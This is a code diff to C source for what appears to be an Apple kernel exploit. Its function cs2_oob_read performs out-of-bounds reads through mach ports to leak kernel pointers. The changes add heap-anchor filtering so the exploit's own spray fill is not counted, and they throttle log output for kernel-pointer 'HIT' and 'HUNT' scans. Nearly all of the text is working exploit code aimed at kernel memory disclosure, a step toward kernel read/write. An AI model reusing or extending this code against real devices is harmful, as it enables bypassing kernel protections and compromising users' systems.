@@ -150,6 +150,7 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
             if (nread >= 16) memcpy(&q1, buffer + 8, sizeof(q1));
             uint64_t unmarked = 0, kptr_n = 0, spray_n = 0, first_foreign = 0;
             uint64_t zerofill_n = 0;
+            uint64_t anchor_n = 0;   /* own fil-tag (real heap anchor) qwords */
             static uint64_t kptr_seen[8] = {0};
             static int kptr_seen_n = 0;
             uint64_t unmarked_q[12] = {0}; int unmarked_q_n = 0;
@@ -158,6 +159,10 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                 uint64_t q = 0;
                 memcpy(&q, buffer + qi * 8, sizeof(q));
                 if (q == cs2_ctx.random_marker) continue;
+                /* anchor-tag law: the REAL same-boot heap anchor is OUR OWN
+                   fill. Skip before any shape count — an anchor-tagged
+                   window is never a KERNEL POINTER claim. */
+                if (cs2_ctx.heap_anchor_armed && q == cs2_ctx.heap_anchor) { anchor_n++; continue; }
                 if (q == 0) { zerofill_n++; continue; }  /* v2: the 0x7000 zero-hole page is NOT kernel content */
                 unmarked++;
                 if (!first_foreign) first_foreign = q;
@@ -192,19 +197,34 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                     if (hit_logs++ < 8) {
                         const char *cls = "other";
                         if (kptr_n) cls = "KERNEL POINTER";
+                        else if (anchor_n) cls = "anchor-tagged";
                         else if (spray_n) cls = "spray-page tag";
-                        LOG("oob HIT lane=%s kind=%s cls=%s w=%zd try=%llu q0=%#llx foreign=%#llx unmarked=%llu kptr=%llu spray=%llu",
+                        LOG("oob HIT lane=%s kind=%s cls=%s w=%zd try=%llu q0=%#llx foreign=%#llx unmarked=%llu kptr=%llu spray=%llu anchor=%llu",
                             w == -1 ? "efault" : "copy27",
                             partial ? "PARTIAL" : "WHOLESALE",
                             cls, w, (unsigned long long)try_idx, q0, first_foreign,
                             (unsigned long long)unmarked,
                             (unsigned long long)kptr_n,
-                            (unsigned long long)spray_n);
+                            (unsigned long long)spray_n,
+                            (unsigned long long)anchor_n);
                     }
                 }
-                    /* v2: the unmarked dump + the kptr rows */
-                    for (int ui = 0; ui < unmarked_q_n; ui++)
-                        LOG("[oob] HIT unmarked[%d]=%#llx", ui, (unsigned long long)unmarked_q[ui]);
+                    /* v2: the unmarked dump + the kptr rows.
+                       2026-11-19 cs2_krw_log 3: 1.6k windows carried the
+                       same two constants — 26k spam lines. Dump only the
+                       first 8 distinct foreign values. */
+                    {
+                        static uint64_t dumped_first[8] = {0};
+                        static int dumped_n = 0;
+                        int fresh = 1;
+                        for (int di = 0; di < dumped_n; di++)
+                            if (dumped_first[di] == first_foreign) { fresh = 0; break; }
+                        if (fresh) {
+                            if (dumped_n < 8) dumped_first[dumped_n++] = first_foreign;
+                            for (int ui = 0; ui < unmarked_q_n; ui++)
+                                LOG("[oob] HIT unmarked[%d]=%#llx", ui, (unsigned long long)unmarked_q[ui]);
+                        }
+                    }
                     for (int ki = 0; ki < kptr_seen_n; ki++)
                         LOG("[oob] HIT kptr[%d]=%#llx", ki, (unsigned long long)kptr_seen[ki]);
                     /* v2: the bidirectional HUNT around this anchor (hole
@@ -224,6 +244,7 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                                 uint64_t wq = 0;
                                 memcpy(&wq, buffer + wqi * 8, sizeof(wq));
                                 if (wq == cs2_ctx.random_marker) continue;
+                                if (cs2_ctx.heap_anchor_armed && wq == cs2_ctx.heap_anchor) continue;   /* own fill, not a kptr claim */
                                 if (wq == 0) { wz++; continue; }
                                 wu++;
                                 if (!wf) wf = wq;
@@ -233,12 +254,20 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                                     if (wk_n < 4) wk_seen[wk_n++] = wq;
                                 }
                             }
-                            if (wu)
-                                LOG("[oob] HUNT %#llx content=%llu zero=%llu kptr=%llu%s first=%#llx",
-                                    (unsigned long long)(0x3f00 + offset + steps2[si2]),
-                                    (unsigned long long)wu, (unsigned long long)wz,
-                                    (unsigned long long)wk, wk ? "  <-- POINTERS" : "  <-- CONTENT",
-                                    (unsigned long long)wf);
+                            if (wu) {
+                                static uint64_t whunt_logs = 0;
+                                whunt_logs++;
+                                /* 2026-11-19: identical content lines flooded
+                                   1.5k rows. Pointers print ALWAYS; content
+                                   prints first 48 + every 256th. */
+                                if (wk || whunt_logs <= 48 || (whunt_logs % 256) == 0)
+                                    LOG("[oob] HUNT %#llx content=%llu zero=%llu kptr=%llu%s first=%#llx (line %llu)",
+                                        (unsigned long long)(0x3f00 + offset + steps2[si2]),
+                                        (unsigned long long)wu, (unsigned long long)wz,
+                                        (unsigned long long)wk, wk ? "  <-- POINTERS" : "  <-- CONTENT",
+                                        (unsigned long long)wf,
+                                        (unsigned long long)whunt_logs);
+                            }
                             for (int ki = 0; ki < wk_n && ki < 4; ki++)
                                 LOG("[oob] HUNT kptr=0x%016llx", (unsigned long long)wk_seen[ki]);
                             if (wu > 0) break;
@@ -273,6 +302,7 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                                 uint64_t hq = 0;
                                 memcpy(&hq, buffer + hqi * 8, sizeof(hq));
                                 if (hq == cs2_ctx.random_marker) continue;
+                                if (cs2_ctx.heap_anchor_armed && hq == cs2_ctx.heap_anchor) continue;   /* own fill, not a kptr claim */
                                 if (hq == 0) { hz++; continue; }
                                 hu++;
                                 if (!hf) hf = hq;
